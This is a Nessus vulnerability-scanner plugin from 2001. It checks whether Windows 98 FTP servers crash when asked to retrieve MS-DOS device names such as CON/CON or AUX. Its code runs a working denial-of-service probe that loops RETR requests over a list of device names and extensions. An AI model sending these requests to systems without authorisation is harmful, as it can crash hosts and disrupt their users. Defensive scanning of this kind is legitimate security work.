#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added links to the Bugtraq message archive and Microsoft Knowledgebase
#
# This script is a copy of http_w98_devname_dos.nasl. 
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10929);
 script_version("$Revision: 1.15 $");
 script_name(english:"FTP Windows 98 MS/DOS device names DOS");
 
 desc["english"] = "
It was possible to freeze or reboot Windows by
reading a MS/DOS device through FTP, using
a file name like CON\CON, AUX.htm or AUX.

A cracker may use this flaw to make your
system crash continuously, preventing
you from working properly.

Solution : upgrade your system or use a 
FTP server that filters those names out.

Reference : http://support.microsoft.com/default.aspx?scid=KB;en-us;Q256015
Reference : http://online.securityfocus.com/archive/1/195054

Risk factor : High";

 desc["francais"] = "
Il a été possible de geler ou faire rebooter
Windows en lisant un périphérique MS/DOS par
FTP, via un nom comme CON\CON, AUX.htm ou AUX.

Un pirate peut utiliser ce problème pour faire 
continuellement rebooter votre système, vous 
empêchant de travailler correctement.

Solution : mettez à jour votre système ou 
utilisez un serveur FTP qui filtre ces noms.

Facteur de risque : Elevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Crashes Windows 98";
 summary["francais"] = "Tue Windows 98";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright("This script is Copyright (C) 2001 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencies("find_service.nes", "ftp_anonymous.nasl");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

include("ftp_func.inc");

# The script code starts here

login = get_kb_item("ftp/login");
pass  = get_kb_item("ftp/password");

# login = "ftp";
# pass = "test@test.com";

if (! login) exit(0);

start_denial();

dev[0] = "aux";
dev[1] = "con";
dev[2] = "prn";
dev[3] = "clock$";
dev[4] = "com1";
dev[5] = "com2";
dev[6] = "lpt1";
dev[7] = "lpt2";

ext[0] = ".foo";
ext[1] = ".";
ext[2] = ". . .. ... .. .";
ext[3] = "-";

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(! get_port_state(port)) exit(0);

soc = open_sock_tcp(port);
if (! soc) exit(0);
r = ftp_recv_line(socket: soc);
ftp_close(socket: soc);
if (! r)
{
  exit(0);
}

 for (i = 0; dev[i]; i = i + 1)
 {
  d = dev[i];
  for (j = 0; ext[j]; j = j + 1)
  {
   e = ext[j];
   if (e == "-")
    name = string(d, "/", d);
   else
    name = string(d, e);
   soc = open_sock_tcp(port);
   if(soc)
   {
    if (ftp_authenticate(socket:soc, user:login, pass:pass))
    {
     port2 = ftp_pasv(socket:soc);
     soc2 = open_sock_tcp(port2, transport:get_port_transport(port));
     req = string("RETR ", name, "\r\n");
     send(socket:soc, data:req);
     if (soc2) close(soc2);
    }
    close(soc);
   }
  }
 }


alive = end_denial();					     
if(!alive)
{
 security_hole(port);
 set_kb_item(name:"Host/dead", value:TRUE);
 exit(0);
}

# Check if FTP server is still alive
r = NULL;
soc = open_sock_tcp(port);
if (soc)
{
  r = ftp_recv_line(socket: soc);
  ftp_close(socket: soc);
}

if (! r)
{
  m = "It was possible to kill your FTP server
by reading a MS/DOS device, using
a file name like CON\CON, AUX.htm or AUX.

A cracker may use this flaw to make your
server crash continuously, preventing
you from working properly.

Solution : upgrade your system or use a 
FTP server that filters those names out.

Risk factor : High";

  security_hole(port: port, data: m);
}
